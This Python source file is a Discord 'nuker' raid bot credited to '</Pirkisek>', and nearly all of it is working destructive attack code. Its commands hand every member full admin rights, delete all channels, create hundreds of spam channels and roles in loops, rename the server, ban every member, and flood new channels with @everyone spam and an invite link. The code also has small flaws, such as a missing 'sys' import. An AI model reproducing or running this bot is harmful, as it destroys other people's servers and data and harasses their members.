import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio
import os
import json
from threading import Thread
import requests
from discord.utils import get
import time


intents = discord.Intents.default()
intents.members = True


if not os.path.isfile("config.json"):
    sys.exit("'ADD TOKEN TO CONFIG.JSON")
else:
    with open("config.json") as file:
        config = json.load(file)


SPAM_CHANNEL = ["LMAO RAIDED BY </Pirkisek>", "RAID BY </Pirkisek>", "FUCKED UP BY </Pirkisek>"]
SPAM_MESSAGE = ["@everyone Server raided by </Pirkisek>", "DONT FUCK WITH </Pirkisek>", "@everyone", "@everyone join https://discord.gg/6HhkjDAu or ban "]
webhook_usernames = [
    "LOSER", "SERVER FUCKED UP", "</Pirkisek> fucked up with u",
    "LOL"
]
client = commands.Bot(command_prefix="*", intents=intents)




@client.event
async def on_ready():
    print('''

logged in sucefully✅

Ready to fuck up servers ❤️

 ''')
    await client.change_presence(activity=discord.Game(name="Hi ^^"))


@client.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.logout()
    print(Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)


@client.command()
async def nukeserver(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        print("admin gaven to all members")
    except:
        print("i failed to give everyone admin")
    for channel in guild.channels:
        try:
            await channel.delete()
            print("DELETING CHANNELS")
        except:
            print("failed to delete a channel")
    for role in guild.roles:
        try:
            await ctx.guild.create_role(name="Fucked up")
            print("Spamming roles Sucefully")
        except:
            print("failed to spam a role")
    await guild.create_text_channel("NUKED BY </Pikisek>")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age=0, max_uses=0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"nuked {guild.name} Successfully.")
    return
@client.command()
async def nukespam(ctx):
    while True:
        await ctx.message.delete()
        await ctx.guild.create_role("raid by </pirkisek>")
        print("Sucefully Spamming roles")


@client.command()
async def nukename(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    await ctx.guild.edit(name="SERVER NUKED BY </Pikisek>")
    print("NAME CHANGED SUCEFULLY")
    latters = "a:b:c:d:e:f:g:h:i:j:k:l:m:n:o:p:q:r:s:t:u:v:w:x:y:,:+:*:/:#: "
    lattersL = latters.split()



@client.command()
async def nukeban(ctx):
 await ctx.message.delete()
 print("Banned All Members Sucefully")
 for user in ctx.guild.members:
        try:
            await user.ban()
        except:
           pass



@client.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(random.choice(SPAM_MESSAGE))

client.run(config["token"])
